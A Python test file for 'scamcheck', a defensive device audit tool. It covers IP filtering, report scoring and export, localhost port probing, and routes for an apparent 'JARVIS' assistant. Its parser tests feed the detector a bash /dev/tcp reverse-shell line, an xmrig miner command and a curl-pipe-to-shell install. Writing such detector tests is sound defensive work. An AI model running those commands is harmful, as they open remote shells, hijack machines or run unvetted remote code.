#!/usr/bin/env python3
"""v0.12 tests: read-only device audit, LAN guards, export and routes.

Everything is local and deterministic. Run: python3 tests/test_deviceaudit.py
"""

import hashlib
import json
import os
import socket
import subprocess
import sys
import tempfile
import time

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)

HOME = tempfile.mkdtemp(prefix="scamcheck-device-")
os.environ["SCAMCHECK_HOME"] = HOME
os.environ["SCAMCHECK_REGION"] = "IN"
os.environ["SCAMCHECK_JARVIS_AI"] = "never"
os.environ.pop("OPENAI_API_KEY", None)
os.environ.pop("ANTHROPIC_API_KEY", None)

from scamcheck import deviceaudit                            # noqa: E402
from scamcheck.jarvis import JarvisSession                    # noqa: E402


def check(name, ok, detail=""):
    print("[%s] %s" % ("PASS" if ok else "FAIL", name))
    if detail:
        print("      " + str(detail))
    return 0 if ok else 1


def minimal_report(**overrides):
    report = {
        "version": "0.12.0",
        "generated_at": time.time(),
        "platform": sys.platform,
        "host": {"hostname": "test-host"},
        "summary": {"risk": "low", "score": 0, "findings": {}, "checks_run": 1,
                    "skipped": [], "active_lan": False, "lan_included": False},
        "findings": [],
        "sections": {},
        "device_checklists": {"macos": ["keep SIP on"]},
    }
    report.update(overrides)
    return report


def test_private_ipv4():
    failures = 0
    accepted = ["192.168.1.5", "10.0.0.1", "172.16.4.4", "169.254.10.20"]
    rejected = ["8.8.8.8", "1.1.1.1", "172.32.0.1", "0.0.0.0",
                "::1", "2001:db8::1", "not-an-ip", "192.168.1.1.1", ""]
    for value in accepted:
        failures += check("private IPv4 accepted: " + value,
                          deviceaudit._private_ipv4(value))
    for value in rejected:
        failures += check("non-private rejected: " + (value or "<empty>"),
                          not deviceaudit._private_ipv4(value))
    return failures


def test_parsers():
    failures = 0
    hits = deviceaudit._suspicious_command("bash -i >& /dev/tcp/10.0.0.9/4444 0>&1")
    failures += check("reverse shell pattern detected",
                      any("reverse" in h or "interactive" in h for h in hits), hits)
    hits = deviceaudit._suspicious_command("xmrig --donate-level 1 -o pool:3333")
    failures += check("miner command detected",
                      any("miner" in h for h in hits), hits)
    hits = deviceaudit._suspicious_command(
        "curl -fsSL https://example.com/install.sh | sh")
    failures += check("curl-pipe-shell detected",
                      any("curl" in h for h in hits), hits)
    failures += check("normal python command is quiet",
                      deviceaudit._suspicious_command("python3 app.py --port 8080") == [])
    failures += check("temp path is suspicious",
                      deviceaudit._path_is_suspicious("/tmp/dropper"))
    failures += check("Applications path is normal",
                      not deviceaudit._path_is_suspicious("/Applications/Safari.app"))
    redacted = deviceaudit._redact("token=abc123 password=hunter2 keep me")
    failures += check("secrets are redacted",
                      "abc123" not in redacted and "hunter2" not in redacted,
                      redacted)
    return failures


def test_scoring_and_sorting():
    failures = 0
    auditor = deviceaudit.DeviceAudit(active_lan=False, include_lan=False,
                                      include_mobile=False)
    auditor.add(deviceaudit._finding("low", "files", "low note", "detail"))
    auditor.add(deviceaudit._finding("critical", "process", "critical note", "detail"))
    auditor.add(deviceaudit._finding("medium", "network", "medium note", "detail"))
    report = auditor.report()
    failures += check("risk score reaches critical", report["summary"]["risk"] == "critical",
                      report["summary"])
    severities = [f["severity"] for f in report["findings"]]
    failures += check("findings sorted by severity",
                      severities == ["critical", "medium", "low"], severities)
    failures += check("counts are correct",
                      report["summary"]["findings"] ==
                      {"critical": 1, "medium": 1, "low": 1},
                      report["summary"]["findings"])
    failures += check("report keeps host section shape",
                      isinstance(report["host"], dict))
    return failures


def test_device_guess():
    failures = 0
    cases = [
        ({"open_ports": [62078]}, "iPhone/iPad"),
        ({"open_ports": [7000]}, "Apple TV / media device"),
        ({"open_ports": [9100]}, "printer"),
        ({"open_ports": [3389]}, "Windows computer"),
        ({"open_ports": [445]}, "computer / NAS"),
        ({"open_ports": [], "vendor": "Samsung"}, "TV / appliance"),
        ({"open_ports": []}, "unknown"),
    ]
    for item, expected in cases:
        got = deviceaudit.DeviceAudit._guess_device(item)
        failures += check("device guess: " + expected, got == expected, got)
    return failures


def test_probe_ports():
    failures = 0
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("127.0.0.1", 0))
    server.listen(1)
    port = server.getsockname()[1]
    closed = port + 1 if port < 65535 else port - 1
    try:
        open_ports = deviceaudit.DeviceAudit._probe_ports(
            "127.0.0.1", [port, closed], timeout=0.3)
    finally:
        server.close()
    failures += check("TCP probe finds the listening port", port in open_ports,
                      open_ports)
    failures += check("TCP probe ignores the closed port", closed not in open_ports,
                      open_ports)
    return failures


def test_format_report():
    failures = 0
    text = deviceaudit.format_report(minimal_report())
    failures += check("summary report renders", "Device audit" in text and "LOW" in text)
    full = deviceaudit.format_report(minimal_report(
        sections={"network": {"gateway": "192.168.1.1"}},
        findings=[deviceaudit._finding("high", "process", "bad thing", "details")],
    ), full=True)
    failures += check("full report renders sections",
                      "## Network" in full and "bad thing" in full, full[:200])
    failures += check("empty report is handled",
                      deviceaudit.format_report(None) == "No device audit report.")
    return failures


def test_export():
    failures = 0
    out = tempfile.mkdtemp(prefix="scamcheck-device-out-")
    folder = os.path.join(out, "run1")
    exported = deviceaudit.export_report(minimal_report(), folder)
    failures += check("export writes report.json",
                      os.path.isfile(exported["json"]))
    failures += check("export writes report.md",
                      os.path.isfile(exported["markdown"]))
    failures += check("export writes SHA256SUMS",
                      os.path.isfile(exported["sha256sums"]))
    mode = os.stat(folder).st_mode & 0o777
    failures += check("export folder is private (0700)", mode == 0o700, oct(mode))
    sums = open(exported["sha256sums"], "r", encoding="utf-8").read().splitlines()
    ok = True
    for line in sums:
        digest, name = line.split("  ", 1)
        path = os.path.join(folder, name)
        with open(path, "rb") as fh:
            ok = ok and hashlib.sha256(fh.read()).hexdigest() == digest
    failures += check("SHA256SUMS matches exported files", ok and len(sums) == 2, sums)
    payload = json.load(open(exported["json"], "r", encoding="utf-8"))
    failures += check("exported JSON is the report",
                      payload["host"]["hostname"] == "test-host")
    return failures


def test_cli_passive():
    failures = 0
    out = tempfile.mkdtemp(prefix="scamcheck-device-cli-")
    env = dict(os.environ)
    env["SCAMCHECK_HOME"] = HOME
    env["PYTHONPATH"] = ROOT
    cmd = [sys.executable, "-m", "scamcheck", "--device-audit",
           "--device-no-lan", "--device-no-mobile", "--device-out", out, "--json"]
    proc = subprocess.run(cmd, cwd=ROOT, env=env, capture_output=True, text=True,
                          timeout=240)
    failures += check("passive CLI exits 0", proc.returncode == 0, proc.stderr[-400:])
    try:
        payload = json.loads(proc.stdout)
    except ValueError:
        payload = {}
        failures += check("passive CLI prints JSON", False, proc.stdout[:300])
    if payload:
        report = payload.get("report") or {}
        export = payload.get("export") or {}
        failures += check("CLI report has a summary",
                          isinstance(report.get("summary"), dict))
        failures += check("CLI report skips active LAN",
                          report["summary"].get("active_lan") is False)
        failures += check("CLI exports a report folder",
                          os.path.isfile(export.get("json") or ""))
        failures += check("CLI did not include LAN section",
                          "lan" not in (report.get("sections") or {}))
    return failures


def test_jarvis_routes():
    failures = 0
    session = JarvisSession()
    help_text = session.handle("scan device help")["text"]
    failures += check("JARVIS device help", "read-only" in help_text, help_text)

    original_cls = deviceaudit.DeviceAudit
    original_export = deviceaudit.export_report
    calls = {}

    class FakeAudit:
        def __init__(self, **kwargs):
            calls["init"] = kwargs

        def run(self):
            calls["run"] = True
            return minimal_report()

        def collect_lan(self):
            calls["lan"] = True
            return {"devices": []}

        def report(self):
            return minimal_report()

    deviceaudit.DeviceAudit = FakeAudit
    deviceaudit.export_report = lambda report, out_dir=None: {
        "folder": "/tmp/fake-device-report"}
    try:
        reply = session.handle("scan device full")["text"]
        failures += check("JARVIS scan device runs the audit",
                          calls.get("run") and "test-host" in reply, reply[:200])
        failures += check("JARVIS scan device exports",
                          "Report saved: /tmp/fake-device-report" in reply)
        failures += check("JARVIS scan device is passive by default",
                          calls["init"].get("active_lan") is False, calls["init"])
        reply = session.handle("scan device active")["text"]
        failures += check("JARVIS active mode is opt-in",
                          calls["init"].get("active_lan") is True, calls["init"])
        reply = session.handle("scan network")["text"]
        failures += check("JARVIS scan network is LAN-only",
                          calls.get("lan") is True and "test-host" in reply, reply[:200])
    finally:
        deviceaudit.DeviceAudit = original_cls
        deviceaudit.export_report = original_export
    return failures


def main():
    print("scamcheck device audit tests (v0.12)")
    print("data dir:", HOME)
    print()
    failures = 0
    for fn in (test_private_ipv4, test_parsers, test_scoring_and_sorting,
               test_device_guess, test_probe_ports, test_format_report,
               test_export, test_cli_passive, test_jarvis_routes):
        failures += fn()
        print()
    print("FAILED: %d checks" % failures if failures else "All checks passed.")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
